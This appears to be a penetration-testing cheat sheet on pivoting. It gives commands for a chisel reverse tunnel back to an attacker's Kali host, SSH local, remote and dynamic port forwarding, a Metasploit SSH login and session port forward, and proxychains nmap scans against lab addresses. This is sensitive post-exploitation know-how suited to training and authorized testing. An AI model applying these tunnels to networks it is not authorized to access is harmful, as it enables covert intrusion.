- - -

#### Pivioting With Chisel :
First you need to install chisel from github then compile it and then transfer it to target machine. <br>

##### Usage :

**<u>On kali</u>** :
```sh
./chisel server -p 8000 -reverse
```

**<u>From client</u>**:
```sh
./chisel client **<Your_Kali_IP>**:8000 R:8001:127.0.0.1:1337
```
<br>

- - -
### Is port forwarding possible with SSH ?

Super Useful : https://refabr1k.gitbook.io/oscp/info-gathering/ssh/ssh-tunneling 

```sh
ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip] 


"Local Port"
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    																			 

"Remote Port"
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    									
 ```
<br>

- - -
### Port Forwarding using Metasploit : 

```sh
use auxiliary/scanner/ssh/ssh_login 
set rhosts 192.168.1.108 
set username raj 
set password 123 
exploit 
sessions -u 1 
sessions 2 
netstat -antp 
portfwd add -l <on_port_we_want_it> -p <target_port> -r 127.0.0.1  
```
<br>

- - -
## Proxychains :

When you want to forward many target ports in a dynamic manner, using ssh you can create such a dynamic tunnel with the -D switch. Then, using this tunnel and proxychains you can forward all scans/traffic  through ssh for every requested port in a dynamic manner. 

```sh
ssh -i id_rsa -D 1337 errorcauser@10.10.11.45 
sudo nano /etc/proxychains.conf 
```

comment out “<mark class="hltr-dark-orange">socks4 127.0.0.1 9050</mark>”  and  add "<mark class="hltr-green">socks5 127.0.0.1 1337</mark>" to the end of file.
```
sudo proxychains nmap -sVT 172.16.45.130 -Pn  
sudo proxychains nmap -sVT 127.0.0.1 -Pn 
```

Choose the port you want to transfer then transfer it with the command below : 
``` 
sudo ssh -i id_rsa -L 80:127.0.0.1:80 errorcauser@10.10.11.45 
```
<br>

- - -
